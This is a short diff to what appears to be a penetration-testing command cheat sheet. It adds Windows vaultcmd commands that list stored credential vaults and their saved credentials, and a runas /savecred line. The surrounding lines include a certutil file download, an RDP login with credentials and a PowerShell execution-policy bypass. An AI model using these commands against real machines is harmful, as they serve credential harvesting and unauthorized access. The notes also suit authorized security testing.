@@ -89,7 +89,9 @@ certutil.exe -urlcache -split -f "URL" OUTFILE
 
 xfreerdp /u:USER /p:PASS /cert:ignore /v:RHOST
 
-git clone https://github.com/melnicek/peh
+vaultcmd /list
+vaultcmd /listcreds:"VAULT"
+runas /user:USER /savecred EXECUTABLE
 
 powershell -ep bypass
 
